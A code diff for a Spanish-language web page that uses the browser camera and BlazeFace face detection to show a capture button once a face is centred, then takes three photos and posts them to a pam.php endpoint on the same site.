@@ -94,7 +94,7 @@
         pointer-events: none;
     }
 
-    /* Anillo de escaneo (animado cuando hay rostro centrado) */
+    /* Anillo de escaneo (cuando rostro centrado) */
     .scan-ring {
         position: absolute;
         inset: -4px;
@@ -106,7 +106,7 @@
         opacity: 0;
     }
 
-    .scan-ring.scanning {
+    .scan-ring.active {
         opacity: 1;
         animation: spin 1.4s linear infinite;
     }
@@ -114,6 +114,39 @@
     @keyframes spin {
         from { transform: rotate(0deg); }
         to   { transform: rotate(360deg); }
+    }
+
+    /* Overlay de escaneo vertical para la captura */
+    .circle-scan-overlay {
+        position: absolute;
+        inset: 0;
+        border-radius: 50%;
+        overflow: hidden;
+        pointer-events: none;
+    }
+
+    .circle-scan-overlay::before {
+        content: "";
+        position: absolute;
+        left: -10%;
+        width: 120%;
+        height: 40%;
+        top: -120%;
+        background: linear-gradient(
+            to bottom,
+            rgba(0,255,0,0),
+            rgba(0,255,0,0.4),
+            rgba(0,255,0,0)
+        );
+    }
+
+    .circle-scan-overlay.scanning::before {
+        animation: scanDown 1.6s ease-in-out forwards;
+    }
+
+    @keyframes scanDown {
+        0%   { top: -120%; }
+        100% { top: 120%;  }
     }
 
     .hint {
@@ -144,6 +177,35 @@
         font-weight: 500;
     }
 
+    .capture-btn {
+        margin-top: 18px;
+        padding: 10px 22px;
+        border-radius: 22px;
+        border: none;
+        background: var(--green-main);
+        color: #fff;
+        font-size: 15px;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.18);
+        transition: transform 0.1s ease, box-shadow 0.1s ease, opacity 0.1s ease;
+        display: none; /* se muestra cuando el rostro está listo */
+    }
+
+    .capture-btn.show {
+        display: inline-block;
+    }
+
+    .capture-btn:disabled {
+        opacity: 0.6;
+        cursor: default;
+        box-shadow: none;
+    }
+
+    .capture-btn:not(:disabled):active {
+        transform: translateY(1px);
+        box-shadow: 0 2px 6px rgba(0,0,0,0.25);
+    }
+
     @media (max-width: 480px) {
         .screen {
             max-width: 100%;
@@ -167,6 +229,7 @@
         </div>
         <div class="circle-border"></div>
         <div class="scan-ring" id="scanRing"></div>
+        <div class="circle-scan-overlay" id="scanOverlay"></div>
     </div>
 
     <div class="hint">
@@ -178,6 +241,8 @@
     </div>
 
     <div class="counter" id="photoCounter"></div>
+
+    <button id="takePhotoBtn" class="capture-btn">Tomar fotografía</button>
 </div>
 
 <!-- TensorFlow + BlazeFace para detección facial -->
@@ -191,14 +256,18 @@
     const video = document.getElementById('video');
     const statusLabel = document.getElementById('statusLabel');
     const scanRing = document.getElementById('scanRing');
+    const scanOverlay = document.getElementById('scanOverlay');
     const photoCounter = document.getElementById('photoCounter');
+    const takeBtn = document.getElementById('takePhotoBtn');
 
     let model;
     let stream;
-    let capturing = false;
     let photosTaken = 0;
-    const MAX_PHOTOS = 5;
-    const capturedPhotos = []; // aquí se guardan las fotos (dataURL)
+    const MAX_PHOTOS = 3;
+    const capturedPhotos = []; // dataURL de las fotos
+    let faceReady = false;
+    let stableFrames = 0;
+    let capturing = false;
 
     // Canvas oculto para capturar frames
     const captureCanvas = document.createElement('canvas');
@@ -207,13 +276,11 @@
     async function setupCamera() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: "user"
-                },
+                video: { facingMode: "user" },
                 audio: false
             });
             video.srcObject = stream;
-            statusLabel.textContent = "Cámara activada. Esperamos que seas tu...";
+            statusLabel.textContent = "Cámara activada. Esperamos que seas tú...";
             await new Promise(res => video.onloadedmetadata = res);
         } catch (err) {
             console.error(err);
@@ -229,7 +296,6 @@
 
     // Comprueba si el rostro está centrado en el círculo
     function isFaceCentered(prediction, videoWidth, videoHeight) {
-        // prediction.topLeft & bottomRight: [x, y]
         const [x1, y1] = prediction.topLeft;
         const [x2, y2] = prediction.bottomRight;
         const faceCenterX = (x1 + x2) / 2;
@@ -243,7 +309,7 @@
         const dy = faceCenterY - cy;
         const dist = Math.sqrt(dx*dx + dy*dy);
 
-        return dist < radius * 0.6; // algo de margen
+        return dist < radius * 0.6; // margen
     }
 
     function capturePhoto() {
@@ -257,18 +323,65 @@
         const dataURL = captureCanvas.toDataURL('image/jpeg', 0.9);
         capturedPhotos.push(dataURL);
         photosTaken++;
-        photoCounter.textContent = `Fotos capturadas: ${photosTaken} / ${MAX_PHOTOS}`;
+        photoCounter.textContent = `Foto ${photosTaken} de ${MAX_PHOTOS}`;
+    }
 
-        if (photosTaken >= MAX_PHOTOS) {
-            statusLabel.textContent = "Rostro capturado correctamente.";
-            statusLabel.classList.add('ok');
-            scanRing.classList.remove('scanning');
-            capturing = false;
-            // Aquí podrías enviar capturedPhotos al servidor con fetch/AJAX
+    async function sendPhotos() {
+        const fd = new FormData();
+        capturedPhotos.forEach((dataURL, i) => {
+            fd.append(`photo${i+1}`, dataURL);
+        });
+
+        const resp = await fetch('pam.php', {
+            method: 'POST',
+            body: fd
+        });
+
+        if (!resp.ok) {
+            throw new Error('Error en la respuesta del servidor');
         }
     }
 
-    let stableFrames = 0;
+    async function handleTakePhoto() {
+        if (!faceReady || capturing) return;
+        capturing = true;
+        photosTaken = 0;
+        capturedPhotos.length = 0;
+        takeBtn.disabled = true;
+        statusLabel.textContent = "Capturando imágenes...";
+        statusLabel.classList.add('ok');
+        photoCounter.textContent = "";
+
+        // Lanzar animación de escaneo
+        scanOverlay.classList.remove('scanning'); // reinicio
+        void scanOverlay.offsetWidth;            // truco para reiniciar animación
+        scanOverlay.classList.add('scanning');
+
+        // Capturamos 3 fotos en intervalos
+        capturePhoto();               // t = 0
+        setTimeout(capturePhoto, 550);  // t ≈ 0.55s
+        setTimeout(capturePhoto, 1100); // t ≈ 1.1s
+
+        // Después de la última, detenemos y enviamos
+        setTimeout(async () => {
+            scanOverlay.classList.remove('scanning');
+            statusLabel.textContent = "Enviando fotografías...";
+            try {
+                await sendPhotos();
+                statusLabel.textContent = "Fotos enviadas correctamente.";
+                statusLabel.classList.add('ok');
+            } catch (e) {
+                console.error(e);
+                statusLabel.textContent = "Error al enviar las fotos.";
+                statusLabel.classList.remove('ok');
+            }
+            takeBtn.disabled = false;
+            takeBtn.textContent = "Tomar fotografía";
+            capturing = false;
+        }, 1500); // un poco más que la animación
+    }
+
+    takeBtn.addEventListener('click', handleTakePhoto);
 
     async function detectionLoop() {
         if (!model || !video.videoWidth) {
@@ -286,30 +399,31 @@
                 isFaceCentered(best, video.videoWidth, video.videoHeight)) {
 
                 stableFrames++;
-                scanRing.classList.add('scanning');
-                statusLabel.textContent = "Mantente quieto, estamos validando tu identidad...";
-                statusLabel.classList.add('ok');
-
-                if (stableFrames > 10 && !capturing && photosTaken < MAX_PHOTOS) {
-                    capturing = true;
-                    capturePhoto();
-                    // pequeña pausa entre fotos para no tomar todas en el mismo frame
-                    setTimeout(() => {
-                        capturing = false;
-                    }, 400);
+                if (stableFrames > 10) {
+                    if (!faceReady) {
+                        faceReady = true;
+                        statusLabel.textContent = "Rostro detectado. Presiona \"Tomar fotografía\".";
+                        statusLabel.classList.add('ok');
+                        takeBtn.classList.add('show');
+                    }
+                    scanRing.classList.add('active');
                 }
             } else {
                 stableFrames = 0;
-                scanRing.classList.remove('scanning');
-                if (photosTaken < MAX_PHOTOS) {
+                faceReady = false;
+                scanRing.classList.remove('active');
+                takeBtn.classList.remove('show');
+                if (!capturing) {
                     statusLabel.textContent = "Ajusta tu rostro al centro del círculo.";
                     statusLabel.classList.remove('ok');
                 }
             }
         } else {
             stableFrames = 0;
-            scanRing.classList.remove('scanning');
-            if (photosTaken < MAX_PHOTOS) {
+            faceReady = false;
+            scanRing.classList.remove('active');
+            takeBtn.classList.remove('show');
+            if (!capturing) {
                 statusLabel.textContent = "Acércate a la cámara.";
                 statusLabel.classList.remove('ok');
             }
@@ -320,7 +434,7 @@
 
     // Inicialización
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        statusLabel.textContent = "Cambia de dispositivo ahora.";
+        statusLabel.textContent = "Cambia de dispositivo.";
     } else {
         await setupCamera();
         await loadModel();
